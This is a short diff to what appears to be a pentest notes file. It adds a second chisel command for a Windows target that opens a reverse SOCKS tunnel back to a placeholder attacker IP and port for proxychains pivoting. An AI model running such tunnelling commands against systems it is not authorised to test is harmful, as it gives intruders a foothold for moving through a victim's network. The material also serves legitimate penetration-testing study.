@@ -21,6 +21,8 @@ upload chisel.exe to windows target and run following command.
 
 ```bash
 chisel.exe client <attacker_IP>:<Local_listening_port> R:socks &
+
+chisel.exe client <attacker_IP>:<Local_listening_port> R:[port_file_proxychain]:socks &
 ```
 
 ![image](https://user-images.githubusercontent.com/55615071/189031515-c4c54896-bd04-40c0-bc7b-43dc82c63afb.png)
